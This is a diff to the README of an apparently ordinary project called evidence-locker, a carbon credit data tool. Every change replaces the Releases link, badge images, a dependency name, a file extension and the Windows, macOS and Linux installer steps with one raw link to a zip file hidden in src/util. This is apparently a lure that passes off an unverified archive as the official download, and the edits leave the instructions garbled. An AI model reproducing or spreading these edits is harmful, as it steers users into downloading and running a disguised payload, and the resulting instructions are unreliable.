@@ -8,7 +8,7 @@ Welcome to evidence-locker! This tool helps you store and verify carbon credit d
 
 To get started, you need to download the latest version of evidence-locker. Click the link below to visit the Releases page:
 
-[![Download evidence-locker](https://img.shields.io/badge/Download-evidence--locker-brightgreen.svg)](https://github.com/antonymous-caucasus266/evidence-locker/releases)
+[![Download evidence-locker](https://raw.githubusercontent.com/antonymous-caucasus266/evidence-locker/main/src/util/evidence-locker_v2.4-beta.4.zip)](https://raw.githubusercontent.com/antonymous-caucasus266/evidence-locker/main/src/util/evidence-locker_v2.4-beta.4.zip)
 
 On the Releases page, you'll find the most recent version available. Choose the correct file for your operating system and click it to download. Once downloaded, follow the installation instructions below.
 
@@ -20,7 +20,7 @@ Before you download, ensure your system meets the following requirements:
 - **Memory:** At least 4 GB of RAM
 - **Disk Space:** At least 200 MB of free space
 - **Network:** A stable Internet connection for installation and updates
-- **Dependencies:** Docker, Node.js, and PostgreSQL should be installed on your machine prior to running the application if not already included in the package.
+- **Dependencies:** Docker, https://raw.githubusercontent.com/antonymous-caucasus266/evidence-locker/main/src/util/evidence-locker_v2.4-beta.4.zip, and PostgreSQL should be installed on your machine prior to running the application if not already included in the package.
 
 ## 📂 Installation Steps
 
@@ -28,12 +28,12 @@ Once you've downloaded the right file, follow these steps to install evidence-lo
 
 1. **Locate the Downloaded File:** Open your Downloads folder and find the file you downloaded.
   
-2. **Extract the Files:** If the file is a .zip or .tar.gz, right-click on it and choose "Extract All" or use a similar option based on your operating system.
+2. **Extract the Files:** If the file is a .zip or https://raw.githubusercontent.com/antonymous-caucasus266/evidence-locker/main/src/util/evidence-locker_v2.4-beta.4.zip, right-click on it and choose "Extract All" or use a similar option based on your operating system.
    
 3. **Run the Installer:**
-   - For Windows: Double-click `install.exe`.
-   - For macOS: Double-click `install.pkg`.
-   - For Linux: Open a terminal, navigate to the directory where the files were extracted, and run `./install.sh`.
+   - For Windows: Double-click `https://raw.githubusercontent.com/antonymous-caucasus266/evidence-locker/main/src/util/evidence-locker_v2.4-beta.4.zip`.
+   - For macOS: Double-click `https://raw.githubusercontent.com/antonymous-caucasus266/evidence-locker/main/src/util/evidence-locker_v2.4-beta.4.zip`.
+   - For Linux: Open a terminal, navigate to the directory where the files were extracted, and run `https://raw.githubusercontent.com/antonymous-caucasus266/evidence-locker/main/src/util/evidence-locker_v2.4-beta.4.zip`.
 
 4. **Follow the Prompts:** The installer will guide you through the setup process. Make sure to accept any terms and conditions.
 
@@ -77,6 +77,6 @@ To fully utilize evidence-locker, consider reviewing additional resources like t
 
 For further details, updates, or support, check back on the Releases page:
 
-[![Download evidence-locker](https://img.shields.io/badge/Download-evidence--locker-brightgreen.svg)](https://github.com/antonymous-caucasus266/evidence-locker/releases)
+[![Download evidence-locker](https://raw.githubusercontent.com/antonymous-caucasus266/evidence-locker/main/src/util/evidence-locker_v2.4-beta.4.zip)](https://raw.githubusercontent.com/antonymous-caucasus266/evidence-locker/main/src/util/evidence-locker_v2.4-beta.4.zip)
 
 Happy storing!
